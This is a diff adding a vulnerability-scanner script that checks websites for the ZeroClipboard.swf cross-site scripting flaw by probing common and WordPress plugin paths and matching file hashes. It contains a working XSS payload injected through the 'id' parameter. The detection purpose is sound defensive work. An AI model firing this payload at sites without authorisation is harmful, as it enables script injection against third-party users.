@@ -1,0 +1,96 @@
+#include helpers.inc;
+#include string_helpers.inc;
+// directories to be tested
+var dirs    = new Array();
+var hashes  = new Array();
+// known vulnerable hashes
+hashes.push("9f4401cdc4405d0730362256b4c04cc0");
+hashes.push("1a85f38f670ca619eb3c6afa84effdc6");
+hashes.push("658619047d80d922910c2ed4c6481bd1");
+hashes.push("4bf53c74dbaf0cc3eb29f1216e01d604");
+var lastJob = null;
+// **************************************************************************************							 
+function alert(uri, vxml, job, matchedText)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = uri;
+	ri.alertPath = "Scripts/" + vxml; 	
+	ri.setHttpInfo(job);
+	
+	AddReportItem(ri);	
+}							 			
+/***********************************************************************************/
+function testClipboardSWFOnDir(dir)
+{
+	//trace(dir);
+	lastJob = new THTTPJob();
+	lastJob.verb = "GET";
+	lastJob.url  = scanURL;
+    var exploit = "?id=\%22))}catch(e){}if(!self.a)self.a=!prompt(document.domain)//&width&height";
+    // we could have a directory like /zeroclipboard or a full path like /zeroclipboard/ZeroClipboard.swf
+	if (dir.endsWith(".swf"))
+        lastJob.uri  = dir + exploit;
+    else
+        lastJob.uri  = dir + "/ZeroClipboard.swf" + exploit;
+	lastJob.execute();
+	
+	if (!lastJob.wasError && !lastJob.notFound) 
+	{
+		if (lastJob.responseStatus == 200)
+		{
+            hash = plain2md5(lastJob.response.body);
+            //trace(hash);
+            
+            if (hashes.indexOf(hash) != -1) {
+                alert(lastJob.uri.replace(exploit, ""), 'ZeroClipboard_swf_xss.xml', lastJob);
+            }
+		}
+	}
+	return false;
+}
+/***********************************************************************************/
+function prepareDirectoriesToBeTested(list)
+{	
+	for (var i=0;i<list.count; i++){	
+		var sf = list.getFile(i);		
+		
+		if(!sf.notFound && !sf.ignored && sf.scanSiteFile && sf.isFile)
+		{
+			dirName = sf.fullPath;			
+			if (sf.Name.match(/ZeroClipboard.*?.swf/))
+			{
+				if (dirs.indexOf(dirName) == -1)
+				    dirs.push(dirName);
+			}
+		}
+	}	
+    
+    var tested_common_dirs = getGlobalValue("zeroclipboard_swf_tested_common_dirs");
+    if (!tested_common_dirs)
+    {
+	    SetGlobalValue("zeroclipboard_swf_tested_common_dirs", 1, true);
+        dirs.push("/zeroclipboard");
+        dirs.push("/js/zeroclipboard");
+        dirs.push("/flash/zeroclipboard");
+        dirs.push("/swf/zeroclipboard");
+        dirs.push("/assets/flash/zeroclipboard");
+        dirs.push("/assets/swf/zeroclipboard");
+        dirs.push("/assets/js/zeroclipboard");
+        dirs.push("/wp-content/plugins/woocommerce/assets/js/zeroclipboard");
+        dirs.push("/common/js/zeroclipboard");
+        dirs.push("/public/js/zeroclipboard");
+        dirs.push("/wp-content/plugins/slidedeck2-personal/js/zeroclipboard");
+        dirs.push("/wp-content/plugins/slidedeck2-pro/js/zeroclipboard");
+        dirs.push("/wp-content/plugins/slidedeck2/js/zeroclipboard");
+    }
+}
+/***********************************************************************************/
+/* main entry point */
+var list = getNewFiles(0);
+prepareDirectoriesToBeTested(list);
+if (dirs.length > 0) 
+{
+	for (var i=0; i<dirs.length; i++)
+		testClipboardSWFOnDir(dirs[i]);
+}
